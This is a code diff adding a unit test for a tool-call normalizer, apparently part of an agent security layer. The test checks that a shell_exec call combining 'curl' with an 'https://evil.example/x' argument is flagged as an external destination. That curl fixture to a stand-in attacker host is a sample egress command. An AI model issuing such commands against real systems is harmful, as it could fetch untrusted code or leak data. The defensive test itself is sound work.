@@ -52,6 +52,13 @@ def test_shell_exec_no_external_destination():
     assert obj.external_destination is None
 
 
+def test_shell_exec_command_plus_args_resolves_egress_destination():
+    # {"command": "curl", "args": ["https://evil.example/x"]} used to surface
+    # only "curl" (args wasn't composed in) and miss the destination entirely.
+    obj = normalize("shell_exec", {"command": "curl", "args": ["https://evil.example/x"]})
+    assert obj.external_destination == "evil.example"
+
+
 # ---------------------------------------------------------------------------
 # 3. Network request path is UNCHANGED (regression guard)
 # ---------------------------------------------------------------------------
